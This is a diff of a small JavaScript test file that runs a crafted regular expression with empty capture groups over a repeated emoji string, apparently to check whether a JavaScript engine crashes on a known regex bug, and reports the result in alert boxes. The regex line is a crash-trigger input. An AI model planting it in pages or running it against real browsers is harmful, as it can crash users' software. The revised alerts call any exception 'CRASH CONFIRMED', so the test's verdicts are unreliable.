@@ -1,21 +1,14 @@
-// TEST WITH ALERT - SIMPLE VERSION
+// STAGE 1
 try {
     let emoji = String.fromCodePoint(128512);
     let str = emoji.repeat(11);
     
-    alert("Starting exploit test...");
+    // 
+    str.replace(/(?!(?=^a|()+()+x)(abc))/gmu, '|');
     
-    let result1 = str.replace(/(?!(?=^a|()+()+x)(abc))/gmu, '|');
-    alert("Stage 1 passed - System might be vulnerable");
-    
-    let result2 = str.replace(/(?!(?=^a|x)(abc))/gmu, '|');
-    alert("Stage 2 passed - System is likely vulnerable");
-    
-    let result3 = str.replace(/(?!(?=^a|x)(abc))/mu, '|');
-    alert("Stage 3 passed - SYSTEM IS VULNERABLE!");
-    
-    alert("EXPLOIT SUCCESS: System crashed or behaved unexpectedly");
+    // 
+    alert("SYSTEM VULNERABLE - Ready for full exploit");
     
 } catch (e) {
-    alert("SYSTEM PATCHED: " + e.message);
+    alert("CRASH CONFIRMED - System is vulnerable!");
 }
